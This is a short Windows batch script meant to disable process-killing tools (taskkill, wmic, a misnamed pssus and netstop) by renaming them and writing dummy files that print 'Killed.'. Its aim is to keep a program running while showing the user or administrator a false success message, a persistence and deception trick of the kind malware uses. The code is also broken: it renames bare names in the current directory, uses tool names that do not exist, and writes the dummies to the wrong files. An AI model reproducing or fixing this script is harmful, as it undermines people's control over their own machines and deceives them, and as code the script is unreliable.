@echo off
::removes the commands to kill proccesses (doesnt delete just renames)
REM Rename the kill command
ren kill kill_disabled.bat

REM Create a dummy kill executable
echo "Killed." > kill_disabled.bat

REM Rename the taskkill command
ren taskkill taskkill_disabled.bat

REM Create a dummy taskkill executable
echo "Killed." > taskkill_disabled.bat

REM Rename the pssus command
ren pssus pssus_disabled.bat

REM Create a dummy pssus executable
echo "Killed." > pssus_disabled.bat

REM Rename the wmic command
ren wmic wmic_disabled.bat

REM Create a dummy wmic executable
echo "Killed." > wmic_disabled.bat

REM Rename the net stop command
ren netstop netstop_disabled.bat

REM Create a dummy net stop command
echo "Killed." > netstop_disabled.bat